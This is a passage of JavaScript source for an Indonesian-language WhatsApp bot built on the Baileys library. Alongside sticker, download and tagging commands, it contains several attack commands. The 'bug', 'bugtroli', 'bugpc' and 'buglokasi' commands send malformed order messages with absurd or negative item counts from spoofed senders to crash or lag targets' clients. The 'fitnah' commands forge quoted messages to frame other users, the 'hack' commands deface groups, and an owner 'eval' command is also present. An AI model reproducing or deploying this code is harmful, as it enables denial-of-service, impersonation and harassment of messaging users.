            file = await wann.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await wann.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4', duration: 359996400,
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            wann.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
         } else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await wann.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await wann.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/gif',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            wann.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedDocument) && args.length == 0) {
            encmediau = isQuotedDocument ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await wann.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await wann.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'text/plain',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            wann.sendMessage(from, ini_buffer, document, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await wann.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await wann.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4', duration: 359996400,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            wann.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/dokumen/gif/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
				
case 'botstat':
				var groups = wann.chats.array.filter(v => v.jid.endsWith('g.us'))
				var privat = wann.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
				var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
					uptime = process.uptime();
					const timestampu = speed();
					const totalChat = await wann.chats.all()
					const latensi = speed() - timestampu
					var total = math(`${groups.length} ${privat.length}`)
					const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = wann.user.phone
					stamtus = `⍟ ────────────────── ⍟

Private Chat : ${privat.length}
Group Chat : ${groups.length}
Total Chat : ${totalChat.length}
Speed : ${latensi.toFixed(4)} second
Runtime : ${kyun(uptime)}
Baterai : ${baterai.battery}
Charged : ${baterai.isCharge}
Mode : ${banChat ? 'public' : 'self'}
Penggunaan Ram : ${ram2}
Hostname : ${os.hostname()}
Platform : ${os.platform()}
Uptime : ${kyun(os.uptime())}
MNC : ${mnc}
MCC : ${mcc}
Device Model: ${wann.user.phone.device_model}
Device Manufactur : ${device_manufacturer}
Wa Version: ${wann.user.phone.wa_version}
Os Version: ${wann.user.phone.os_version}

⍟ ────────────────── ⍟`
reply(stamtus)
break
				case 'tobc':
				if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
				wann.updatePresence(from, Presence.composing)
					anu = await wann.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await wann.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							wann.sendMessage(_.jid, buff, audio, { quoted: ftrol })
						}
						} else if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await wann.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							wann.sendMessage(_.jid, buff, sticker, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
							}
							} else{
          reply('reply sticker/audio')
							}
					break
					case 'fdeface':
var nn = body.slice(9)
                                var urlnye = nn.split("|")[0];
                                var titlenye = nn.split("|")[1];
                                var descnye = nn.split("|")[2];
                                imgbbb = require('imgbb-uploader')
                                run = getRandom('.jpeg')
                                encmediad = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                                mediad = await wann.downloadAndSaveMediaMessage(encmediad)
                                ddatae = await imageToBase64(JSON.stringify(mediad).replace(/\"/gi, ''))
                                wann.sendMessage(from, {
                                        text: `${urlnye}`,
                                        matchedText: `${urlnye}`,
                                        canonicalUrl: `${urlnye}`,
                                        description: `${descnye}`,
                                        title: `${titlenye}`,
                                        jpegThumbnail: ddatae
                                }, 'extendedTextMessage', { detectLinks: false })
                                break
                                break
					case 'online':
            if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
				offline = false
				reply('Status : ONLINE')
				break
			case 'offline':
			if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
				offline = true
                waktuafk = Date.now()
                anuu = body.slice(9) ? body.slice(9) : '-'
                alasanafk = anuu
				reply('Fitur OFFLINE diaktifkan')
				break
           case 'fitnahpc':
                if (args.length < 1) return reply(`Usage :\n${prefix}fitnahpc [nomor|pesan|balasanbot]]\n\nEx : \n${prefix}fitnahpc 0|hai|hai juga markenlin`)
                var gh = body.slice(10)
                var parti = gh.split("|")[0];
                var targetq = gh.split("|")[1];
				var bot = gh.split("|")[2];
			    wann.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${parti}@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { conversation: `${targetq}` }}})
					break
            case 'hidetag':
            if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
            ht = body.slice(9)
                members_id = []
				for (let mem of groupMembers) {
					members_id.push(mem.jid)
				}
                mentions(ht, members_id, false)
                break
            case 'fitnah':
            if (!isGroup) return reply(mess.only.group)
                cr = body.slice(4)
                cs = cr.split('|')
                taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
                const target = {
					contextInfo: {
						participant: taged,
						quotedMessage: {
							extendedTextMessage: {
								text: cs[1]
							}
						}
					}
				}
				wann.sendMessage(from, cs[2], MessageType.text, target)
				break
              case 'hacked':
              if (!isGroup) return reply(mess.only.group)
              if (!isGroupAdmins) return reply(mess.only.admin)
              if (!isBotGroupAdmins) return reply(mess.only.Badmin)
              if (args.length < 1) return reply('Teksnya?')
              reply('Otw Hack')
                tessgc = await getBuffer(`https://i.ibb.co/m4Qx3JG/20210319-204838.jpg`)
                   wann.updateProfilePicture (from, tessgc)
                   await sleep(1000)
                wann.groupUpdateSubject(from, `HACKED BY ${body.slice(8)}`)
                await sleep(1000)
                wann.groupUpdateDescription(from, `_${pushname} telah meretas grup ini_`)             
                await sleep(1000)
                wann.sendMessage(from, 'Succes Hacked', text, {quoted: mek})
					break
					case 'hack':
					if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
              if (!isGroup) return reply(mess.only.group)
              if (!isGroupAdmins) return reply(mess.only.admin)
              if (!isBotGroupAdmins) return reply(mess.only.Badmin)
              sendBug(from)
              wann.groupUpdateSubject(from, `HACKED BY wann`)
                wann.groupUpdateDescription(from, `_${me.jid}_`)
             wann.updateProfilePicture(from, fs.readFileSync('./media/image/me.jpg'))
                wann.sendMessage(from, 'Succes!', text, {quoted: mek})
                await sleep(3000)
                wann.groupLeave(from)
					break
					case 'bugpc2':
if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
if (args.length < 1) return reply('Jumlahnya?')
for (let i = 0; i < args[0]; i++) {
wann.sendMessage(from, `${NamaBot}`, MessageType.extendedText,{
 quoted: {
key: {
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
orderMessage: {
itemCount: 99999999,
status: 1,
surface: 10,
orderTitle: `${NamaOwner}`,
sellerJid: '0@s.whatsapp.net'
}}}}, 0)
}
break
					case 'bug':
					if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
					if (args.length < 1) return reply('Jumlahnya?')
				 for (let i = 0; i < args[0]; i++) {
await wann.toggleDisappearingMessages(from, 0)
}
reply('Sukses send bug sebanyak '+args.join(' '))
					break
					
					case 'bugtroli':
              if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
     function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function troli(nomor){
wann.sendMessage(nomor, `▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
▒▒█▒▒▒▄██████████▄▒▒▒▒
▒█▐▒▒▒████████████▒▒▒▒
▒▌▐▒▒██▄▀██████▀▄██▒▒▒
▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
▐┼▐▒▒██████████████▒▒▒
▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
▒▒█████──────────▐███▌
▒▒█▀▀██▄█─▄───▐─▄███▀▒
▒▒█▒▒███████▄██████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒█████████▐▌██▌▒▒▒
▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒`, MessageType.extendedText,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
    orderMessage: {
    thumbnail: ofrply,
    itemCount: -969769349, // Bug
    status: 1,
    surface: 1,
    message: '☠️Asylum☠️',
    orderTitle: 'AsylumVirus', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
}
function bug(jid){
for(let i=0;i < 1;i++){
var
WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
wann.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}	
async function attack(targett){
bug(targett)
await sleep(100)
troli(targett)
await sleep(100)
bug(targett)
}

attack(mek.key.remoteJid)
break
case 'bugtroli2':
if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
if (args.length < 1) return reply('Jumlahnya?')
		        try {
		        var hets = `${NamaBot}`
		        var grousp = await wann.groupMetadata(from)
                var membere = grousp['participants']
                var mems = []
                membere.map(async adm => {
                    mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
                })
                var options = {
                    text: hets,
                    contextInfo: { mentionedJid: mem },
                    quoted: mek
                }
		        for (let i = 0; i < args[0]; i++) {
		        wann.sendMessage(from, options, text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": -3599964009,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `${NamaBot}`,
						"orderTitle": `${NamaOwner}`,
						"sellerJid": "6283161567237@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}})
		        }
		        } catch {
		          for(let i=0;i<10;i++){
		        wann.sendMessage(from, 'Berhasil Mengirim Bug Troli2', text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": -3599964009,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `${NamaBot}`,
						"orderTitle": `${NamaOwner}`,
						"sellerJid": "6283161567237@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}})
		        }
		        }
		       break
case 'bugcombine':
if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
                 wann.toggleDisappearingMessages(from, 'HACKED')
wann.sendMessage(from, `${NamaBot}`, text, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: `${NamaBot}`,
    orderTitle: `${NamaOwner}`, // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
setTimeout( () => {
	    wann.updatePresence(from, Presence.composing)
	    sendMess(`dahlah`)
	    }, 2000)
	    reply(`dahlah`)
break
case 'buglokasi':
if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
wann.updatePresence(from, Presence.composing)
		       wann.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: `${NamaOwner}`,
						address: `${NamaBot}`,
                        jpegThumbnail: dfrply },location,{
 quoted: {
  key: {
   participant: '111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
    message: `${NamaOwner}`,
    orderTitle: `${NamaBot}`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break
case 'bugpc':
					case 'bugpc':
if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
wann.updatePresence(from, Presence.composing)
wann.sendMessage(from, 'yaudah oke',text, {
 quoted: {
  key: {
   participant: '1111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
    message: `${NamaBot}`,
    orderTitle: `${NamaOwner}`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break
                case 'ytmp4':
						if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`)
						let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
						if (!isLinks2) return reply(mess.error.Iv)
						try {
							reply(mess.wait)
							ytv(args[0])
							.then((res) => {
								const { dl_link, thumb, title, filesizeF, filesize } = res
								axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
								.then((a) => {
								if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, `❏ *YTmp4*\n\n❏ *Title* : ${title}\n❏ *Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Maaf durasi melebihi batas maksimal, Silahkan klik link diatas_`)
								sendFileFromUrl(dl_link, document, {mimetype: 'video/mp4', filename: `${title}.mp4`, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:title,body:"",mediaType:"2",thumbnail:getBuffer(thumb),mediaUrl:`${body.slice(7)}`}}}).catch(() => reply(mess.error.api))
							})
							})
						} catch (err) {
							reply(mess.error.api)
						}
						break
						case 'ytsearch':
            if (!args.length) return reply('Judulnya apa kak?')
            try {
            	reply(mess.wait)
                const input = args.join(" ")
                const filter1 = await ytsd.getFilters(input)
                const filters1 = filter1.get('Type').get('Video')
                const { items } = await ytsd(filters1.url, { limit: 10 })
                let hehe = `┌ ◪ *YOUTUBE SEARCH*
└ *Search Query:* ${input}\n\n`
                for (let i = 0; i < items.length; i++) {
                    hehe += `───────────────\n
┌ ❏ *Judul:* ${items[i].title}
├ ❏ *Id:* ${items[i].id}
├ ❏ *Ditonton:* ${items[i].views}
├ ❏ *Durasi:* ${items[i].duration}
└ ❏ *Link:* ${items[i].url}\n\n`
                }
                thumb = await getBuffer(items[0].bestThumbnail.url)
                await wann.sendMessage(from, thumb, image, {thumbnail: Buffer.alloc(0), quoted: fmen, caption: `${hehe}───────────────\n\n┌ ◪ *DOWNLOAD*
├ ${prefix}ytmp3 [link yt] = Audio
└ ${prefix}ytmp4 [link yt] = Video`})
            } catch(e) {
                reply('Didn\'t find anything or there is any error!')
                reply(`Error: ${e.message}`)
            }
            break
					case 'ytmp3':
						if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`)
						let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
						if (!isLinks) return reply(mess.error.Iv)
						try {
							reply(mess.wait)
							yta(args[0])
							.then((res) => {
								const { dl_link, thumb, title, filesizeF, filesize } = res
								axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
								.then((a) => {
								if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `❏ *YTmp3*\n\n❏ *Title* : ${title}\n❏ *Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Maaf durasi melebihi batas maksimal, Silahkan klik link diatas_`)
								sendFileFromUrl(dl_link, document, {mimetype: 'audio/mp3', filename: `${title}.mp3`, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:title,body:"",mediaType:"2",thumbnail:getBuffer(thumb),mediaUrl:`${body.slice(7)}`}}}).catch(() => reply(mess.error.api))
							})
					        })
						} catch (err) {
							reply(mess.error.api)
						}
						break
                    case 'play':
                            if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
                            const playy = await axios.get(`https://bx-hunter.herokuapp.com/api/yt/search?query=${body.slice(6)}&apikey=${HunterApi}`)
                            const mulaikah = playy.data.result[0].url
                            try {
                                reply(mess.wait)
                                yta(mulaikah)
                                .then((res) => {
                                    const { dl_link, thumb, title, filesizeF, filesize } = res
                                    axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                                    .then(async (a) => {
                                    if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `❏ *PLAYmp3*\n\n❏ *Title* : ${title}\n❏ *Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Maaf durasi melebihi batas maksimal, Silahkan klik link diatas_`)
                                    sendFileFromUrl(dl_link, document, {mimetype: 'audio/mp3', filename: `${title}.mp3`, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:title,body:"",mediaType:"2",thumbnail:getBuffer(thumb),mediaUrl:"https://youtu.be/Ejl9sLbgc1A"}}}).catch(() => reply(mess.error.api))
                                    })
                                })
                            } catch (err) {
                                reply(mess.error.api)
                            }
                            break
                            case 'video':
                            if (args.length === 0) return reply(`Kirim perintah *${prefix}video* _Judul video yang akan dicari_`)
                            const playi = await axios.get(`https://bx-hunter.herokuapp.com/api/yt/search?query=${body.slice(6)}&apikey=${HunterApi}`)
                            const mulaihah = playi.data.result[0].url
                            try {
                                reply(mess.wait)
                                ytv(mulaihah)
                                .then((res) => {
                                    const { dl_link, thumb, title, filesizeF, filesize } = res
                                    axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                                    .then(async (a) => {
                                    if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `❏ *PLAYmp4*\n\n❏ *Title* : ${title}\n❏ *Ext* : MP4\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Maaf durasi melebihi batas maksimal, Silahkan klik link diatas_`)
                                    sendFileFromUrl(dl_link, document, {mimetype: 'video/mp4', filename: `${title}.mp4`, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:title,body:"",mediaType:"2",thumbnail:getBuffer(thumb),mediaUrl:"https://youtu.be/Ejl9sLbgc1A"}}}).catch(() => reply(mess.error.api))
                                    })
                                })
                            } catch (err) {
                                reply(mess.error.api)
                            }
                            break
                    case 'exif':
                    if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
					const exifff = `${args.join(' ')}`
					const namaPack = exifff.split('|')[0]
					const authorPack = exifff.split('|')[1]
					exif.create(namaPack, authorPack)
					await reply('Done gan')
				break
				case 'sticker':
					case 'stiker':
					case 's':
						if (isMedia && !mek.message.videoMessage || isQuotedImage) {
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await wann.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							await ffmpeg(`${media}`)
									.input(media)
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											wann.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)	
											fs.unlinkSync(`./sticker/${sender}.webp`)	
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else if ((isMedia && mek.message.videoMessage.fileLength < 10000000 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
							const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await wann.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							reply(mess.wait)
								await ffmpeg(`${media}`)
									.inputFormat(media.split('.')[4])
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										tipe = media.endsWith('.mp4') ? 'video' : 'gif'
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											wann.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)
											fs.unlinkSync(`./sticker/${sender}.webp`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else {
							reply(`Kirim gambar/video dengan caption ${prefix}sticker atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
						}
						break
					case 'stickerwm':
					case 'swm':
						if (isMedia && !mek.message.videoMessage || isQuotedImage) {
							ppp = `${args.join(' ')}`
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await wann.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							const packname1 = ppp.split('|')[0]
							const author1 = ppp.split('|')[1]
							exif.create(packname1, author1, `stickwm_${sender}`)
							await ffmpeg(`${media}`)
									.input(media)
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											wann.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)	
											fs.unlinkSync(`./sticker/${sender}.webp`)	
											fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else if ((isMedia && mek.message.videoMessage.fileLength < 10000000 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
							wmsti = body.slice(11)
							if (!wmsti.includes('|')) return reply(`Kirim gambar atau reply gambar dengan caption *${prefix}stickerwm nama|author*`)
							const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await wann.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							const packname1 = wmsti.split('|')[0]
							const author1 = wmsti.split('|')[1]
							exif.create(packname1, author1, `stickwm_${sender}`)
							reply(mess.wait)
								await ffmpeg(`${media}`)
									.inputFormat(media.split('.')[4])
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										tipe = media.endsWith('.mp4') ? 'video' : 'gif'
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											wann.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)
											fs.unlinkSync(`./sticker/${sender}.webp`)
											fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else {
							reply(`Kirim gambar/video dengan caption ${prefix}stickerwm nama|author atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
						}
						break
					case 'takestick':
					case 'take':
						if (!isQuotedSticker) return reply(`Reply sticker dengan caption *${prefix}takestick nama|author*`)
						ppp = `${args.join(' ')}`
						const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await wann.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
						const packname = ppp.split('|')[0]
						const author = ppp.split('|')[1]
						exif.create(packname, author, `takestick_${sender}`)
						exec(`webpmux -set exif ./sticker/takestick_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
							if (error) return reply(mess.error.api)
							wann.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
							fs.unlinkSync(media)
							fs.unlinkSync(`./sticker/takestick_${sender}.exif`)
						})
						break
			case 'speed':
			case 'ping':
					const timestampi = speed();
					const latensyi = speed() - timestampi
					reply(`Speed: ${latensyi.toFixed(4)} Second`)
					break
				case 'return':
				if (!isOwner) return reply(mess.only.ownerB)
					return wann.sendMessage(from, JSON.stringify(eval(body.slice(8))), text, {quoted: mek})
					if (err) return wann.sendMessage(from, `root @wann ofc:~ ${err}`, text, { quoted: mek })
                 break
                 case 'toimg':
				case 'tomedia':
					if (!isQuotedSticker) return reply('Reply stiker nya')
					if (mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
						const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await wann.downloadAndSaveMediaMessage(encmedia)
						const upload = await uploadimg(media, Date.now() + '.webp')
						console.log(upload)
						reply(`${upload.result.image}`)
						const rume = await axios.get(`http://nzcha-apii.herokuapp.com/webp-to-mp4?url=${upload.result.image}`)
						console.log(rume.data)
						sendMediaURL(from, rume.data.result)
					} else {
						const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await wann.downloadAndSaveMediaMessage(encmedia)
						ran = '1000.png'
						exec(`ffmpeg -i ${media} ${ran}`, (err) => {
							fs.unlinkSync(media)
							if (err) return reply(mess.error.api)
							buffer = fs.readFileSync(ran)
							wann.sendMessage(from, buffer, image, {quoted: mek})
							fs.unlinkSync(ran)
						})
					}
					break
				case 'ss':
